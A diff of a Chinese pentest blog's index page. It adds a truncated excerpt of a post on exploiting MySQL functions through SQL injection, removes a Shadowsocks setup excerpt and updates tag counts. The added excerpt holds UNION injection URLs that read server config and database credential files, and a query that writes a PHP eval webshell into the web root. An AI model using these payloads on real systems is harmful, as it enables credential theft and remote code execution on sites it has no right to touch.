@@ -83,6 +83,68 @@
 <hr style="height:1px;border:none;border-top:1px dashed #0066CC;" />
 <article>
     <header>
+        <h2><a href="http://wyb0.com/posts/injection-of-mysql-function/">SQL注入之MySQL函数利用</a></h2>
+
+        
+        <div class="post-meta">
+            <div style="padding:5px 5px 2px 5px;">
+                <i class="fa fa-calendar fa-fw"></i>
+                <time>2016-06-20</time>
+                &nbsp;&nbsp;&nbsp;&nbsp;
+            
+
+                
+
+            
+                
+                
+                
+                    <i class="fa fa-folder fa-fw"></i>
+                    
+                        <a class="post-taxonomy-topic" href="http://wyb0.com/topics/pentest">Pentest</a>
+                    
+                
+                
+                &nbsp;&nbsp;&nbsp;&nbsp;
+                
+                
+                
+                    <i class="fa fa-tags fa-fw"></i>
+                    
+                        <a class="post-taxonomy-tag" href="http://wyb0.com/tags/injection">injection</a>
+                    
+                
+                
+            </div>
+        </div>
+    </header>
+
+    
+    <p style="max-height:130px;overflow:hidden;line-height:26px;position: relative;word-wrap: break-word !important;z-index:1;">
+        0x00 load_file()  条件:  1. 要有file_priv权限 2. 知道文件绝对路径 3. 能使用union 4. 对web目录有读权限 注：若过滤了单引号，则可以将函数中的字符进行hex编码   一般步骤
+ 读/etc/init.d下的东西，这里有配置文件路径
+?id=1' union select 1,2,load_file('/etc/init.d/httpd')  得到web安装路径
+?id=1' union select 1,2,load_file('/etc/apache/conf/httpd.conf')  读取密码文件
+?id=1' union select 1,2,load_file('/site/xxx.com/conf/conn.inc.php')    0x01 into outfile  条件：  1. 要有file_priv权限 2. 知道网站绝对路径 3. 要能用union 4. 对web目录有写权限 5. 没有过滤单引号   一般方法
+当知道路径时，可以直接用?id=1 union select &ldquo;&lt;?php @eval($_POST[&lsquo;c&rsquo;]);?&gt;&rdquo; into outfile(&ldquo;C:/phpStudy/WWW/a.php&rdquo;)
+ 其他方法
+ 登陆phpMyAdmin
+use test; 选择数据库为test create table aaa(bbb varchar(64)); 在数据库中创建一个表aaa insert into aaa values(&quot;&lt;?
+    </p>
+
+    
+    <footer>
+        <a href="/posts/injection-of-mysql-function/">Read more<i class="fa fa-angle-double-right fa-fw"></i></a>
+    </footer>
+    
+</article>
+
+
+            
+                
+<hr style="height:1px;border:none;border-top:1px dashed #0066CC;" />
+<article>
+    <header>
         <h2><a href="http://wyb0.com/posts/injection-of-check-database-type/">SQL注入之判断数据库类型</a></h2>
 
         
@@ -589,57 +651,6 @@ sudo yum install openssl openssl-devel
 
 
             
-                
-<hr style="height:1px;border:none;border-top:1px dashed #0066CC;" />
-<article>
-    <header>
-        <h2><a href="http://wyb0.com/posts/ubuntu-use-shadowsocks/">Ubuntu下使用ShadowSocks</a></h2>
-
-        
-        <div class="post-meta">
-            <div style="padding:5px 5px 2px 5px;">
-                <i class="fa fa-calendar fa-fw"></i>
-                <time>2016-06-13</time>
-                &nbsp;&nbsp;&nbsp;&nbsp;
-            
-
-                
-
-            
-                
-                
-                
-                    <i class="fa fa-folder fa-fw"></i>
-                    
-                        <a class="post-taxonomy-topic" href="http://wyb0.com/topics/linux">Linux</a>
-                    
-                
-                
-                &nbsp;&nbsp;&nbsp;&nbsp;
-                
-                
-                
-                    <i class="fa fa-tags fa-fw"></i>
-                    
-                        <a class="post-taxonomy-tag" href="http://wyb0.com/tags/software">software</a>
-                    
-                
-                
-            </div>
-        </div>
-    </header>
-
-    
-    <p style="max-height:130px;overflow:hidden;line-height:26px;position: relative;word-wrap: break-word !important;z-index:1;">
-         环境：Ubuntu14.04
-0x00 安装shadowsocks-qt5 sudo apt-get update sudo apt-get python-software-properties software-properties-common sudo add-apt-repository ppa:hzwhuang/ss-qt5（添加源） sudo apt-get update （更新你的软件库） sudo apt-get install shadowsocks-qt5 (正式安装)  0x01 配置客户端 0x02 配置火狐 0x03 访问YouTube 
-    </p>
-
-    
-</article>
-
-
-            
 
             
 
@@ -686,7 +697,7 @@ sudo yum install openssl openssl-devel
         
             <li style="list-style-type:none;">
                 <i class="fa fa-folder fa-fw"></i>
-                <a href="http://wyb0.com/topics/linux" title="linux">linux(25)</a>
+                <a href="http://wyb0.com/topics/linux" title="linux">linux(26)</a>
             </li>
         
             <li style="list-style-type:none;">
@@ -773,7 +784,7 @@ sudo yum install openssl openssl-devel
         
             <p style="display:inline-block;">
                 <a href="http://wyb0.com/tags/docker" title="docker">docker</a>
-                <sup>4</sup>
+                <sup>5</sup>
             </p>
         
             <p style="display:inline-block;">
